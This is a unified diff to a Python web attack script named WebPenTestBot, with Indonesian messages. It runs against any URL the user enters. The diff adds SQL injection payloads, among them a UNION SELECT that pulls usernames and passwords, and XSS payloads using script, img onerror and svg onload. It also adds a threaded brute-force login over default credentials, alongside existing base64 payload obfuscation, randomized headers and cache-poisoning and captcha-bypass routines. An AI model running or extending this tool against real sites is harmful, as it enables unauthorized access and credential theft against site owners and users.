@@ -8,6 +8,8 @@ import validators
 from urllib.parse import quote_plus
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
 
 class Colors:
     RESET = "\033[0m"
@@ -32,10 +34,11 @@ class WebPenTestBot:
         if self.login_url and self.credentials:
             self.login()
 
-    def log(self, message, color=Colors.RESET):
+    def log(self, message, color=Colors.RESET, extra_info=""):
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
         with open(self.log_file, 'a') as log:
-            log.write(message + '\n')
-        print(f"{color}{message}{Colors.RESET}")
+            log.write(f"{timestamp} - {message} {extra_info}\n")
+        print(f"{color}{message} {extra_info}{Colors.RESET}")
 
     def obfuscate_payload(self, payload):
         encoded_payload = base64.b64encode(payload.encode()).decode()
@@ -73,29 +76,38 @@ class WebPenTestBot:
         return None
 
     async def test_sql_injection(self, path):
-        payload = "admin' OR '1'='1' -- "
-        encoded_payload = self.obfuscate_payload(payload)
+        payloads = [
+            "admin' OR '1'='1' -- ",
+            "' UNION SELECT null, username, password FROM users --",
+            "' OR 1=1 --",
+            "admin' OR 'a'='a' --"
+        ]
         url = self.base_url + path
-        data = {"username": encoded_payload, "password": encoded_payload}
-        
-        async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
-            if 'error' in await response.text():
-                self.log(f"{Colors.YELLOW}[!] Eksploitasi SQL Injection berhasil menyebabkan error pada: {url}{Colors.RESET}")
-            elif 'Welcome' in await response.text():
-                self.log(f"{Colors.GREEN}[!] Eksploitasi SQL Injection berhasil, akses ke akun admin terbuka: {url}{Colors.RESET}")
-            else:
-                self.log(f"{Colors.RED}[x] Tidak ada SQL Injection di {url}{Colors.RESET}")
+        for payload in payloads:
+            encoded_payload = self.obfuscate_payload(payload)
+            data = {"username": encoded_payload, "password": encoded_payload}
+            async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
+                if 'error' in await response.text():
+                    self.log(f"{Colors.YELLOW}[!] Eksploitasi SQL Injection berhasil menyebabkan error pada: {url}{Colors.RESET}")
+                elif 'Welcome' in await response.text():
+                    self.log(f"{Colors.GREEN}[!] Eksploitasi SQL Injection berhasil, akses ke akun admin terbuka: {url}{Colors.RESET}")
+                else:
+                    self.log(f"{Colors.RED}[x] Tidak ada SQL Injection di {url}{Colors.RESET}")
 
     async def test_xss(self, path):
-        payload = "<script>alert('XSS Vulnerability')</script>"
+        payloads = [
+            "<script>alert('XSS Vulnerability')</script>",
+            "<img src='x' onerror='alert(1)'>",
+            "<svg/onload=alert(1)>"
+        ]
         url = self.base_url + path
-        data = {'input': payload}
-        
-        async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
-            if payload in await response.text():
-                self.log(f"{Colors.GREEN}[!] Cross-Site Scripting (XSS) berhasil pada: {url}{Colors.RESET}")
-            else:
-                self.log(f"{Colors.RED}[x] Tidak ada XSS di {url}{Colors.RESET}")
+        for payload in payloads:
+            data = {'input': payload}
+            async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
+                if payload in await response.text():
+                    self.log(f"{Colors.GREEN}[!] Cross-Site Scripting (XSS) berhasil pada: {url}{Colors.RESET}")
+                else:
+                    self.log(f"{Colors.RED}[x] Tidak ada XSS di {url}{Colors.RESET}")
 
     async def test_csrf(self, path):
         url = self.base_url + path
@@ -115,16 +127,18 @@ class WebPenTestBot:
         url = self.base_url + path
         usernames = ['admin', 'user', 'test', 'guest']
         passwords = ['password123', '123456', 'admin', 'password']
-        
-        for username in usernames:
-            for password in passwords:
-                data = {'username': username, 'password': password}
-                async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
-                    if 'Welcome' in await response.text():
-                        self.log(f"{Colors.GREEN}[+] Brute Force berhasil login dengan username: {username} dan password: {password}{Colors.RESET}")
-                        return
-                    else:
-                        self.log(f"{Colors.RED}[x] Gagal login dengan username: {username} dan password: {password}{Colors.RESET}")
+        with ThreadPoolExecutor() as executor:
+            for username in usernames:
+                for password in passwords:
+                    executor.submit(self._brute_force_task, url, username, password)
+
+    def _brute_force_task(self, url, username, password):
+        data = {'username': username, 'password': password}
+        response = requests.post(url, data=data, headers=self.generate_random_headers())
+        if 'Welcome' in response.text:
+            self.log(f"{Colors.GREEN}[+] Brute Force berhasil login dengan username: {username} dan password: {password}{Colors.RESET}")
+        else:
+            self.log(f"{Colors.RED}[x] Gagal login dengan username: {username} dan password: {password}{Colors.RESET}")
 
     async def cache_poisoning(self, path):
         payload = "username=<script>alert('Cache Poisoning')</script>"
@@ -157,7 +171,6 @@ class WebPenTestBot:
     async def analyze_site(self):
         paths = ['/login', '/admin', '/upload', '/search', '/user', '/config', '/files', '/data']
         tasks = []
-
         for path in paths:
             tasks.append(self.test_sql_injection(path))
             tasks.append(self.test_xss(path))
@@ -166,7 +179,6 @@ class WebPenTestBot:
             tasks.append(self.cache_poisoning(path))
             tasks.append(self.api_security_test(path))
             tasks.append(self.bypass_captcha(path))
-
         await asyncio.gather(*tasks)
 
     async def login(self):
@@ -180,6 +192,9 @@ class WebPenTestBot:
                         self.log(f"{Colors.RED}[x] Login gagal!{Colors.RESET}")
             else:
                 self.log(f"{Colors.RED}[x] Tidak dapat mengakses halaman login.{Colors.RESET}")
+
+    async def run(self):
+        await self.analyze_site()
 
 async def main():
     target_url = input(f"{Colors.BLUE}Masukkan URL target (misal: http://example.com): {Colors.RESET}").strip()
@@ -196,8 +211,7 @@ async def main():
             credentials = None
 
         bot = WebPenTestBot(target_url, proxy if proxy else None, login_url, credentials)
-
-        await bot.analyze_site()
+        await bot.run()
 
 if __name__ == "__main__":
     asyncio.run(main())
